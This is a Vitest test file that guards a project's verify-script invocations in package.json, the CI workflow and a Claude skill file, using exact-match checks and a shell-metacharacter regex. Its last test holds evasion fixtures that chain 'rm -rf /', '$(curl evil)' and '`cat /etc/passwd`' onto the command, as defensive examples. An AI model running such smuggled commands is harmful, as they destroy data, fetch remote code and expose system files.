import { describe, it, expect } from 'vitest';
import { existsSync, readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { load } from 'js-yaml';

const ROOT = resolve(__dirname, '../..');

const PACKAGE_JSON = resolve(ROOT, 'package.json');
const WORKFLOW = resolve(ROOT, '.github/workflows/verify.yml');
const SKILL = resolve(ROOT, '.claude/skills/verify-against-source/SKILL.md');
// SKILL.md lives under .claude/, which is gitignored — present locally for
// authors with the tooling installed, absent in CI. The three SKILL-asserting
// tests skip when the file is missing instead of failing CI.
const SKILL_PRESENT = existsSync(SKILL);

/**
 * Axis 6 of the locked eng-review spec: all four invocation paths MUST be
 * three-line thunks calling scripts/verify-against-source.ts with no logic of
 * their own. Why: any per-invocation logic (conditional skips, multi-step
 * setup embedded in the thunk, alternative entrypoints) forks the verify
 * behavior between local and CI, which is exactly the drift the verify skill
 * exists to prevent.
 *
 * This test file mixes exact-string equality (for short deterministic thunks)
 * with a tight forbidden-token regex (for documentation strings that vary).
 * Prior regex `/&&|\|\||;|>\s|<\s/` let through `&`, single `|`, `$(...)`,
 * backticks, unspaced redirects — all of which are sufficient to smuggle
 * arbitrary code into an invocation string.
 */

/**
 * Forbids shell metacharacters that could chain, pipe, redirect, substitute,
 * or background a command. Allowed: whitespace, `-`, `/`, `.`, `_`,
 * alphanumerics, unquoted arg tokens.
 */
const SHELL_METACHAR = /[&|;<>`$()]/;

const EXPECTED_VERIFY_SCRIPT = 'tsx scripts/verify-against-source.ts';
const EXPECTED_PREBUILD_SCRIPT = 'pnpm verify';
const EXPECTED_CI_VERIFY_RUN = 'pnpm verify --since HEAD~1';
const EXPECTED_CI_STEP_ORDER: Array<{ kind: 'uses' | 'run'; match: string | RegExp }> = [
  { kind: 'uses', match: 'actions/checkout@v4' },
  { kind: 'run', match: /apt-get install -y poppler-utils/ },
  { kind: 'uses', match: 'pnpm/action-setup@v4' },
  { kind: 'uses', match: 'actions/setup-node@v4' },
  { kind: 'run', match: 'pnpm install --frozen-lockfile' },
  { kind: 'run', match: 'pnpm vitest run' },
  { kind: 'run', match: 'pnpm astro check' },
  { kind: 'run', match: EXPECTED_CI_VERIFY_RUN },
];

describe('verify-against-source invocation purity', () => {
  it('package.json scripts.verify equals the exact expected thunk', () => {
    const pkg = JSON.parse(readFileSync(PACKAGE_JSON, 'utf-8'));
    expect(pkg.scripts?.verify).toBe(EXPECTED_VERIFY_SCRIPT);
  });

  it('package.json scripts.prebuild equals the exact expected thunk', () => {
    const pkg = JSON.parse(readFileSync(PACKAGE_JSON, 'utf-8'));
    expect(pkg.scripts?.prebuild).toBe(EXPECTED_PREBUILD_SCRIPT);
  });

  it('CI verify step equals the exact expected command (no evasion via $, `, &, |)', () => {
    const wf = load(readFileSync(WORKFLOW, 'utf-8')) as {
      jobs: { verify: { steps: Array<{ name?: string; run?: string; uses?: string }> } };
    };
    const steps = wf.jobs?.verify?.steps ?? [];
    const verifyStep = steps.find(
      (s) => typeof s.run === 'string' && /pnpm verify/.test(s.run),
    );
    expect(verifyStep, 'no step in verify.yml invokes pnpm verify').toBeDefined();
    expect(verifyStep!.run!.trim()).toBe(EXPECTED_CI_VERIFY_RUN);
  });

  it('CI workflow verify job has the exact expected step sequence (M3 whitelist)', () => {
    const wf = load(readFileSync(WORKFLOW, 'utf-8')) as {
      jobs: { verify: { steps: Array<{ run?: string; uses?: string }> } };
    };
    const steps = wf.jobs?.verify?.steps ?? [];
    expect(
      steps.length,
      `verify job step count drifted; expected ${EXPECTED_CI_STEP_ORDER.length}, got ${steps.length}`,
    ).toBe(EXPECTED_CI_STEP_ORDER.length);
    EXPECTED_CI_STEP_ORDER.forEach((expected, i) => {
      const step = steps[i];
      if (expected.kind === 'uses') {
        expect(step.uses, `step ${i} uses`).toBe(expected.match);
      } else {
        const run = (step.run ?? '').trim();
        if (expected.match instanceof RegExp) {
          expect(run, `step ${i} run`).toMatch(expected.match);
        } else {
          expect(run, `step ${i} run`).toBe(expected.match);
        }
      }
    });
  });

  it.skipIf(!SKILL_PRESENT)('SKILL.md inline code spans contain no shell metacharacters that would enable chaining', () => {
    const skill = readFileSync(SKILL, 'utf-8');
    // Only inspect backtick-wrapped commands (inline code + fenced blocks with
    // shell invocations); the surrounding markdown table separators use `|`
    // legitimately and are not command text.
    const inlineCode = [...skill.matchAll(/`([^`\n]+)`/g)].map((m) => m[1]);
    const fencedShell = [...skill.matchAll(/```(?:bash|sh)\n([\s\S]*?)\n```/g)].flatMap((m) =>
      m[1].split('\n').map((l) => l.replace(/\s*\\$/, '').trim()).filter(Boolean),
    );
    const commands = [...inlineCode, ...fencedShell].filter((c) =>
      /pnpm\s|tsx\s|scaffold-spec/.test(c),
    );
    expect(commands.length, 'expected at least one documented command').toBeGreaterThan(0);
    for (const c of commands) {
      expect(c, `SKILL.md command contains shell metachar: ${c}`).not.toMatch(SHELL_METACHAR);
    }
  });

  it.skipIf(!SKILL_PRESENT)('SKILL.md has frontmatter with name = verify-against-source', () => {
    const skill = readFileSync(SKILL, 'utf-8');
    const fmMatch = /^---\n([\s\S]*?)\n---/.exec(skill);
    expect(fmMatch, 'SKILL.md missing YAML frontmatter').not.toBeNull();
    const fm = load(fmMatch![1]) as { name?: string };
    expect(fm.name).toBe('verify-against-source');
  });

  it.skipIf(!SKILL_PRESENT)('all four invocation paths point at the same CLI entrypoint', () => {
    const pkg = JSON.parse(readFileSync(PACKAGE_JSON, 'utf-8'));
    const wf = load(readFileSync(WORKFLOW, 'utf-8')) as {
      jobs: { verify: { steps: Array<{ run?: string }> } };
    };
    const skill = readFileSync(SKILL, 'utf-8');

    expect(pkg.scripts.verify).toContain('scripts/verify-against-source.ts');
    expect(pkg.scripts.prebuild).toContain('pnpm verify');
    const ciStep = (wf.jobs.verify.steps ?? []).find(
      (s) => typeof s.run === 'string' && /pnpm verify/.test(s.run),
    );
    expect(ciStep?.run).toContain('pnpm verify');
    expect(skill).toContain('pnpm verify');
  });

  it('M2 regression: known evasions would fail the exact-equality guard', () => {
    // Each of these would have passed the prior /&&|\|\||;|>\s|<\s/ regex but
    // be rejected by toBe(EXPECTED_*). Self-documenting evasion fixtures so a
    // future relaxer sees what the tightening prevents.
    const evasions = [
      'tsx scripts/verify-against-source.ts & rm -rf /',
      'tsx scripts/verify-against-source.ts >/tmp/leak',
      'tsx scripts/verify-against-source.ts $(curl evil)',
      'tsx scripts/verify-against-source.ts | tee /tmp/log',
      'tsx scripts/verify-against-source.ts `cat /etc/passwd`',
    ];
    for (const e of evasions) {
      expect(e).not.toBe(EXPECTED_VERIFY_SCRIPT);
      expect(e).toMatch(SHELL_METACHAR);
    }
  });
});
